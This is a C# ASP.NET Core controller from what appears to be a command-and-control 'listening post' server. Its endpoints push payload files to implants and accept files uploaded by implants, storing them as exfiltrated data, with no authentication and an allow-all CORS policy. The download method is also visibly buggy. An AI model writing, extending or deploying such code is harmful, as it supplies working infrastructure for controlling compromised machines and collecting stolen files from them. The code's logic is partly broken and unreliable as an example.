using ListeningPostApiServer.Data;
using ListeningPostApiServer.Interfaces;
using ListeningPostApiServer.Models;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using System;
using System.IO;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Cors;

namespace ListeningPostApiServer.Controllers
{
    /// <inheritdoc />
    /// <summary>
    /// An Api Controller to provide RESTful CRUD operations for Files hosted on the Listening Post.
    /// Implements the <see cref="T:Microsoft.AspNetCore.Mvc.ControllerBase" />
    /// </summary>
    /// <seealso cref="T:Microsoft.AspNetCore.Mvc.ControllerBase" />
    [ApiController]
    [EnableCors("AllowAll")]
    [ProducesErrorResponseType(typeof(NotFoundResult))]
    [Produces("application/json", "application/octet-stream")]
    [Route("[Controller]")]
    public class FileController : ControllerBase
    {
        #region Fields

        /// <summary>
        /// Holds the file repository Implementation to be consumed by other methods.
        /// </summary>
        private readonly FileRepository _fileRepository;

        #endregion Fields

        #region Constructors

        /// <summary>
        /// Initializes a new instance of the <see cref="FileController" /> class.
        /// </summary>
        /// <param name="fileRepository">A File Repository Interface.</param>
        public FileController(IRepository<FileBase> fileRepository)
        {
            _fileRepository = (FileRepository)fileRepository;
        }

        #endregion Constructors

        #region Methods

        /// <summary>
        /// Downloads the specified file.
        /// </summary>
        /// <param name="id">The file identifier (Guid).</param>
        /// <returns>Task&lt;IActionResult&gt;.</returns>
        /// <remarks>Reliable only in certain instances, needs work.</remarks>
        [HttpGet("download/{id}")]
        public async Task<IActionResult> Download(Guid id)
        {
            if (id != Guid.Empty)
            {
                return Ok(await _fileRepository.GetByGuidAsync(id));
            }

            var fileToSend = await _fileRepository.GetByGuidAsync(id);

            using (var stream = new FileStream(fileToSend.TempFilePath, FileMode.Open))
            {
                return Ok(File(stream, "application/octet-stream", fileToSend.ActualFileName));
            }
        }

        /// <summary>
        /// Retrieves metadata for a particular file stored on the server, or all files if the Guid
        /// is not specified.
        /// </summary>
        /// <param name="id">The identifier.</param>
        /// <returns>Task&lt;IActionResult&gt;.</returns>
        [HttpGet("{id?}")]
        public async Task<IActionResult> Get(Guid? id)
        {
            return id != null ? Ok(await _fileRepository.GetByGuidAsync(id.Value)) : Ok(await _fileRepository.GetAllAsync());
        }

        /// <summary>
        /// Provides a download mechanism for agents to retrieve files assigned to them, stored in
        /// the Listening Post.
        /// </summary>
        /// <param name="nodeId">       The node (agent/implant) identifier.</param>
        /// <param name="fileRequested">The file requested.</param>
        /// <returns>Task&lt;IActionResult&gt;.</returns>
        /// <remarks>Meant for Agent use.</remarks>
        [HttpPost("push/{nodeId}")]
        public async Task<IActionResult> Push([FromRoute]int nodeId, [FromBody] FileBase fileRequested)
        {
            var node = await _fileRepository.Context.Set<Implant>().FindAsync(nodeId);
            var assignedFile = node.PayloadFile;

            var fileToSend = assignedFile;

            if (assignedFile == null)
            {
                var requestedFile = await _fileRepository.Context.Set<PayloadFile>()
                    .FirstOrDefaultAsync(f => f.ActualFileName == fileRequested.ActualFileName);
                if (requestedFile == null)
                    return BadRequest();
                fileToSend = requestedFile;
            }

            using (var stream = new FileStream(fileToSend.TempFilePath, FileMode.Open))
            {
                return Ok(File(stream, "application/octet-stream", fileToSend.ActualFileName));
            }
        }

        /// <summary>
        /// Directly uploads a file to the server, bypassing associating with an agent.
        /// </summary>
        /// <param name="file">The file.</param>
        /// <returns>Task&lt;IActionResult&gt;.</returns>
        /// <remarks>Meant for user access</remarks>
        [HttpPost("upload")]
        public async Task<IActionResult> Upload(IFormFile file)
        {
            if (file.Length <= 0) return BadRequest();

            var filePath = Path.GetTempFileName();

            using (var stream = new FileStream(filePath, FileMode.Create))
            {
                await file.CopyToAsync(stream);
            }

            var newExFile = new PayloadFile
            {
                TempFilePath = filePath,
                ActualFileName = file.FileName
            };

            var newFile = await _fileRepository.CreateAsync(newExFile);
            await _fileRepository.SaveChangesAsync();

            return Ok(newFile);
        }

        /// <summary>
        /// Uploads a File to the server, registering which Agent Uploaded it.
        /// </summary>
        /// <param name="nodeId">The node identifier.</param>
        /// <param name="file">  The file.</param>
        /// <returns>Task&lt;IActionResult&gt;.</returns>
        /// <remarks>Meant to be used by Agents.</remarks>
        [HttpPost("pull/{nodeId}")]
        public async Task<IActionResult> UploadToServer(int nodeId, IFormFile file)
        {
            //if (file.Length <= 0) return BadRequest();

            var filePath = Path.GetTempFileName();

            using (var stream = new FileStream(filePath, FileMode.Create))
            {
                await file.CopyToAsync(stream);
            }

            var implant = await _fileRepository.Context.Set<Implant>().FindAsync(nodeId);

            var newExFile = new ExfiltratedFile
            {
                TempFilePath = filePath,
                FromImplant = implant,
                ActualFileName = file.FileName
            };

            await _fileRepository.CreateAsync(newExFile);
            await _fileRepository.SaveChangesAsync();

            return Ok();
        }

        #endregion Methods
    }
}
